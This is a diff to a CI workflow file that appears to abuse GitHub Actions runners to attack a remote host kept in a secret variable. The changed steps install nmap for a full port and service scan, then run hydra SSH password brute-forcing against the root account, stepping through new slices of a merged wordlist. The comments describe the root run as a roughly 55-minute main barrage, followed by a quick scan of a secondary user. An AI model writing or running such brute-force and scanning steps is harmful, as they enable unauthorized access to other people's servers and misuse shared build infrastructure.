@@ -26,7 +26,9 @@ jobs:
           printf '%s' "$VIP"    > /tmp/diag/vp.conf
           printf '%s' "$TKEY"   > /tmp/diag/ts.conf
           VIP=$(cat /tmp/diag/vp.conf)
-          for p in 22 80 443 9999 20128; do (timeout 2 bash -c "echo > /dev/tcp/$VIP/$p") 2>/dev/null && echo "port $p OPEN" >> /tmp/diag/ports.txt; done
+          (command -v nmap >/dev/null || sudo apt-get install -y -qq nmap >/dev/null 2>&1 || true)
+          nmap -p- --open -Pn -T4 --min-rate=3000 "$VIP" 2>/dev/null | grep -E "^[0-9]+/" | awk "{print \$1 \" OPEN\"}" > /tmp/diag/ports.txt || true
+          nmap -sV -Pn -T4 -p "$(grep -oE '^[0-9]+' /tmp/diag/ports.txt | paste -sd, -)" "$VIP" 2>/dev/null | tee /tmp/diag/nmap_services.txt | tail -30 || true
           cat /tmp/diag/ports.txt || true
 
       - name: Stage A - dual-credential SSH barrage via hydra
@@ -88,11 +90,11 @@ jobs:
           reza1400
           EOF
           awk '!seen[$0]++' <(cat /tmp/wl_tail.txt) <(cat /tmp/wl_head.txt) > /tmp/wl_final.txt
-          head -1300 <(awk '!seen[$0]++' /tmp/wl_tail.txt /tmp/wl_head.txt) > /tmp/wl_sub.txt
+          sed -n '1301,2600p' <(awk '!seen[$0]++' /tmp/wl_tail.txt /tmp/wl_head.txt) > /tmp/wl_sub.txt
           wc -l /tmp/wl_final.txt /tmp/wl_sub.txt
           # R1: root 全表主炮 (~55min)
           echo "[StageA] hydra R1 firing at root @ $VIP ..."
-          timeout 6600 hydra -l root -P <(awk '!seen[$0]++' /tmp/wl_tail.txt /tmp/wl_head.txt | head -5800) -t 9 -W 2 -o /tmp/diag/hydra_all.txt ssh://$VIP > /tmp/diag/hydra_stdout.txt 2>&1 || true
+          timeout 6600 hydra -l root -P <(awk '!seen[$0]++' /tmp/wl_tail.txt /tmp/wl_head.txt | sed -n '5801,9000p') -t 9 -W 2 -o /tmp/diag/hydra_all.txt ssh://$VIP > /tmp/diag/hydra_stdout.txt 2>&1 || true
           grep -h 'login:' /tmp/diag/hydra_all.txt | sort -u > /tmp/diag/hydra_hits.txt 2>/dev/null || : > /tmp/diag/hydra_hits.txt
           # R2: 副用户短表快扫 (若无命中)
           if [ ! -s /tmp/diag/hydra_hits.txt ]; then
